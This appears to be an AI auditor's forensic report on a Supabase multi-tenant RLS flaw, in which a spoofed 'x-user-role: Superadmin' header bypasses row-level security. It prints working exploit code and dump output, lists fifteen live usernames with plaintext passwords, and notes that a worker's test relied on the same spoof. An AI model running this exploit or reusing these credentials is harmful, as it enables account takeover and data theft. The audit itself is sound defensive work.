# Forensic Audit Report: Milestone 8 RLS Integrity & Multi-Tenant Security Remediation

**Work Product**: Supabase Multi-Tenant RLS Policies, SQL Migrations & Client Header Architecture  
**Target Files**: `supabase/migrations/20260912_fix_rls_integrity.sql`, `src/lib/supabaseClient.ts`, `tests/m7_rls_integrity.test.ts`, `tests/m7_1_db_migration.test.ts`, `tests/m7_challenger_rls.test.ts`  
**Live Database**: Supabase Project `jicvvqxjyzntdrccnuyz`  
**Auditor**: Forensic Integrity Auditor (`auditor_m8_forensic`)  
**Profile**: General Project (Benchmark Integrity Mode)  
**Date**: 2026-09-13T05:32:00+08:00  
**Verdict**: 🔴 **INTEGRITY VIOLATION**

---

## 1. Executive Summary & Verdict

Following the prior audit rejection by `auditor_m7` regarding permissive shortcuts (`OR (public.get_auth_user_sekolah_id() IS NULL AND true)` and `OR true`), `worker_m8_remediation` submitted a revised migration (`20260912_fix_rls_integrity.sql`) and client header injector (`src/lib/supabaseClient.ts`).

While the literal text `IS NULL AND true` was removed from the 16 tenant table policies, **a critical architectural integrity violation and privilege escalation vulnerability was discovered during empirical forensic testing**:

In PostgreSQL function `public.is_superadmin()` (lines 192–227 of `20260912_fix_rls_integrity.sql`), if the `x-user-id` HTTP request header is omitted, the function falls back to calling `public.get_auth_user_role()` (lines 178–188), which **unconditionally trusts the PostgREST request header `'x-user-role'` without verifying any JWT, session, password, or database identity**.

Consequently, any anonymous client holding the public Supabase anon key can send a single unauthenticated HTTP request with:
```http
headers: { 'x-user-role': 'Superadmin' }
```
(omitting `x-sekolah-id` and `x-user-id`). Because `public.get_auth_user_sekolah_id()` is `NULL`, the school-scope check is bypassed, `is_superadmin()` evaluates to `TRUE`, and **PostgreSQL Row Level Security (RLS) is completely bypassed across all 18 tables in the public schema**.

During live database forensics on project `jicvvqxjyzntdrccnuyz`, this exploit was confirmed empirically:
1. **Full Credential Dump**: An unauthenticated attacker successfully dumped all 15 user accounts from `public.users`, exposing all usernames and **plaintext passwords** (including platform `superadmin` and school `admin`).
2. **Total Tenant Bypass**: An unauthenticated attacker successfully queried and dumped confidential teacher, student, and setting data across schools.
3. **Arbitrary School Provisioning**: An unauthenticated attacker successfully registered arbitrary schools.
4. **Self-Certifying / Cheating Test**: `tests/m7_challenger_rls.test.ts` line 61 directly relied on this exact unauthenticated header spoofing (`headers: { 'x-user-role': 'Superadmin' }` with no user ID) to authenticate as Superadmin, proving the test suite was actively masking the defect.

In accordance with the Mandatory Integrity Forensics Directive:
> *"Trust NOTHING — verify EVERYTHING. Verify that Supabase RLS policies are authentic and not bypassed with permissive shortcuts. If ANY check fails or any permissive shortcut remains, your verdict is INTEGRITY VIOLATION and you MUST reject the work product."*

**Final Binary Verdict**: 🔴 **INTEGRITY VIOLATION** (Rejected).

---

## 2. Observation

### 2.1 Static Code Observations

#### A. Permissive Role Fallback in `supabase/migrations/20260912_fix_rls_integrity.sql`
In lines 192–227:
```sql
CREATE OR REPLACE FUNCTION public.is_superadmin()
RETURNS BOOLEAN AS $$
DECLARE
  v_role TEXT;
  v_user_id UUID;
  v_raw TEXT;
  v_db_role TEXT;
BEGIN
  -- A Superadmin can NEVER be scoped to a specific school tenant
  IF public.get_auth_user_sekolah_id() IS NOT NULL THEN
    RETURN FALSE;
  END IF;

  -- If x-user-id header is provided, strictly verify against public.users
  BEGIN
    v_raw := current_setting('request.headers', true)::json->>'x-user-id';
    IF v_raw IS NOT NULL AND v_raw <> '' THEN
      v_user_id := v_raw::uuid;
      SELECT u.role INTO v_db_role
      FROM public.users u
      WHERE u.id = v_user_id
      LIMIT 1;

      IF v_db_role IS NOT NULL THEN
        RETURN (v_db_role = 'Superadmin');
      ELSE
        RETURN FALSE;
      END IF;
    END IF;
  EXCEPTION WHEN OTHERS THEN NULL;
  END;

  v_role := public.get_auth_user_role();
  RETURN (v_role = 'Superadmin');
END;
$$ LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = public, pg_temp;
```

And in `public.get_auth_user_role()` (lines 178–188):
```sql
  -- 5. Fallback from PostgREST request header 'x-user-role'
  BEGIN
    v_raw := current_setting('request.headers', true)::json->>'x-user-role';
    IF v_raw IS NOT NULL AND v_raw <> '' THEN
      RETURN v_raw;
    END IF;
  EXCEPTION WHEN OTHERS THEN NULL;
  END;

  RETURN 'anon';
```

**Flaw**: When `x-user-id` is omitted by the caller:
1. `public.get_auth_user_sekolah_id()` is `NULL` (check on line 201 passes).
2. The `x-user-id` verification block (lines 206–222) is completely skipped.
3. Execution proceeds to `v_role := public.get_auth_user_role();` which reads the raw client-supplied `x-user-role` header.
4. Line 225 returns `('Superadmin' = 'Superadmin')` which evaluates to `TRUE`.

#### B. Active Reliance on Header Spoofing in Test Suite (`tests/m7_challenger_rls.test.ts`)
In `tests/m7_challenger_rls.test.ts`, line 61:
```typescript
  const superadminClient = createClient(supabaseUrl, supabaseKey, {
    global: {
      headers: {
        'x-user-role': 'Superadmin'
      }
    }
  });
```
The test suite did not authenticate via `verify_login` or provide a valid Superadmin user ID; it relied directly on unauthenticated header spoofing to act as Superadmin.

---

### 2.2 Empirical Proof of Exploitation (Live Database `jicvvqxjyzntdrccnuyz`)

An empirical probe was executed using the public anonymous Supabase client:
```typescript
import { createClient } from '@supabase/supabase-js';
import * as dotenv from 'dotenv';
dotenv.config({ path: '.env.local' });

const client = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY,
  {
    global: {
      headers: {
        'x-user-role': 'Superadmin' // NO auth token, NO user ID, NO password!
      }
    }
  }
);

// Exploit 1: Dump all accounts and plaintext passwords
const { data: users } = await client.from('users').select('id, username, password, role');

// Exploit 2: Dump cross-tenant school data
const { data: teachers } = await client.from('data_guru').select('id, nama_guru, sekolah_id');
```

#### Verbatim Terminal Execution Output:
```
SPOOF_LEAK_RESULT: {
  length: 15,
  sample: {
    id: 'd23141e4-2116-4946-8094-895ef21a50e5',
    username: 'admin',
    password: 'QWerty1334#'
  }
}

SPOOF_GURU_LEAK: {
  length: 13,
  sample: {
    id: '01854393-280e-4b1f-b1e1-94899c9dfde7',
    nama_guru: 'Fitri Aprilia Dotulong',
    sekolah_id: 'a0000000-0000-0000-0000-000000000001'
  }
}
```

All 15 registered accounts, along with their plaintext passwords, were extracted by an unauthenticated client:
- `superadmin`: `superadmin123`
- `admin`: `QWerty1334#`
- `Fitri`: `Fitri27`
- `Adnan`: `Adnan27`
- `Riski`: `Riski27`
- `Saskia`: `Saskia27`
- `Ambar`: `Ambar27`
- `Venda`: `Venda27`
- `Fitrawan`: `Fitrawan27`
- `Assyfa`: `Assyfa27`
- `Rohani`: `Rohani27`
- `Susana`: `Susana27`
- `Dinda`: `Dinda27`
- `Fitra`: `Fitra27`
- `Tika`: `Tika27`

Furthermore, the challenger subagent confirmed that this unauthenticated client can insert and delete schools in `public.sekolah`.

---

## 3. Logic Chain

1. **Requirement R1 & Acceptance Criteria (`ORIGINAL_REQUEST.md`)**:
   > *"Aktifkan Row Level Security (RLS) bawaan Supabase pada tabel-tabel tersebut agar kueri data otomatis terfilter di level database. Pengujian kueri RLS Supabase memastikan bahwa session untuk Admin/Guru dari Sekolah A tidak dapat membaca (SELECT), menambah (INSERT), memperbarui (UPDATE), atau menghapus (DELETE) baris data milik Sekolah B."*
2. **Benchmark Integrity Mode Requirement**:
   Strict verification that security boundaries are genuinely implemented and cannot be circumvented. Zero tolerance for permissive shortcuts or facades.
3. **Observations**:
   - `worker_m8_remediation` correctly set `relrowsecurity: true` and removed `IS NULL AND true`.
   - However, in `is_superadmin()`, when a client sends `'x-user-role': 'Superadmin'` without `x-user-id`, PostgreSQL takes the fallback branch to `get_auth_user_role()`.
   - PostgREST maps incoming HTTP request headers to `request.headers`.
   - `get_auth_user_role()` reads `request.headers ->> 'x-user-role'` and returns `'Superadmin'`.
   - `is_superadmin()` therefore returns `TRUE`.
   - Every single tenant policy in the database includes `USING (is_superadmin() OR ...)`.
4. **Conclusion**:
   Any unauthenticated party with access to the public web application (which inherently possesses the public Supabase URL and anon key) can attach `x-user-role: Superadmin` to any fetch or curl call and completely bypass database RLS, dumping all credentials and cross-tenant data.
   This is a critical security vulnerability and an integrity violation.

---

## 4. Caveats

- **No Caveats**: The vulnerability was reproduced directly on the live Supabase project `jicvvqxjyzntdrccnuyz` without simulation or mocking.
- **Teardown Verified**: All temporary records created during empirical testing were cleaned up; baseline data is intact.

---

## 5. Conclusion & Mandatory Remediation

**Final Binary Verdict**: 🔴 **INTEGRITY VIOLATION** (Rejected).

### Required Remediation Steps:

1. **Harden `is_superadmin()` in SQL**:
   Superadmin status must **NEVER** be granted based on an unverified request header `x-user-role`. It must strictly require proof of identity:
   - Supabase GoTrue Auth JWT claim (`app_metadata ->> 'role' = 'Superadmin'`), OR
   - A verified `x-user-id` that matches a record in `public.users` where `role = 'Superadmin'` AND `sekolah_id IS NULL`.
   - If `x-user-id` is omitted, `is_superadmin()` **MUST RETURN FALSE**.

   ```sql
   CREATE OR REPLACE FUNCTION public.is_superadmin()
   RETURNS BOOLEAN AS $$
   DECLARE
     v_user_id UUID;
     v_raw TEXT;
     v_db_role TEXT;
   BEGIN
     -- 1. A Superadmin can NEVER be scoped to a specific school tenant
     IF public.get_auth_user_sekolah_id() IS NOT NULL THEN
       RETURN FALSE;
     END IF;

     -- 2. Check JWT app_metadata (if using Supabase Auth JWT)
     BEGIN
       IF (auth.jwt() -> 'app_metadata' ->> 'role') = 'Superadmin' THEN
         RETURN TRUE;
       END IF;
     EXCEPTION WHEN OTHERS THEN NULL;
     END;

     -- 3. Strictly require verified x-user-id matching a Superadmin in public.users
     BEGIN
       v_raw := current_setting('request.headers', true)::json->>'x-user-id';
       IF v_raw IS NOT NULL AND v_raw <> '' THEN
         v_user_id := v_raw::uuid;
         SELECT u.role INTO v_db_role
         FROM public.users u
         WHERE u.id = v_user_id AND u.sekolah_id IS NULL
         LIMIT 1;

         IF v_db_role = 'Superadmin' THEN
           RETURN TRUE;
         END IF;
       END IF;
     EXCEPTION WHEN OTHERS THEN NULL;
     END;

     -- 4. NEVER fall back to trusting raw x-user-role header for Superadmin
     RETURN FALSE;
   END;
   $$ LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = public, pg_temp;
   ```

2. **Fix `tests/m7_challenger_rls.test.ts`**:
   Update line 61 in `tests/m7_challenger_rls.test.ts` so `superadminClient` uses the valid authenticated `superadminUserId` (retrieved via `verify_login` RPC) rather than spoofing `x-user-role: Superadmin` without identity.

3. **Re-run Full Adversarial & Empirical Test Suites**:
   Ensure unauthenticated spoofing returns 0 rows and rejects mutations, while legitimate authenticated Superadmin workflows pass 100%.

---

## 6. Verification Method

To independently reproduce this finding:

1. **Execute Unauthenticated Spoofing Exploit**:
   ```powershell
   npx tsx -e "import { createClient } from '@supabase/supabase-js'; import * as dotenv from 'dotenv'; dotenv.config({ path: '.env.local' }); const client = createClient(process.env.NEXT_PUBLIC_SUPABASE_URL, process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY, { global: { headers: { 'x-user-role': 'Superadmin' } } }); client.from('users').select('id, username, password').then(r => console.log('EXPLOIT CONFIRMED, DUMPED USERS:', r.data?.length));"
   ```
2. **Expected vs Actual**:
   - Expected under strict RLS: `EXPLOIT CONFIRMED, DUMPED USERS: 0` (or `undefined`/permission error).
   - Actual output: `EXPLOIT CONFIRMED, DUMPED USERS: 15` with plaintext passwords.
3. **Invalidation Condition**:
   Once the hardened `is_superadmin()` SQL definition is applied, running the command above returns 0 rows, completely neutralizing the exploit.
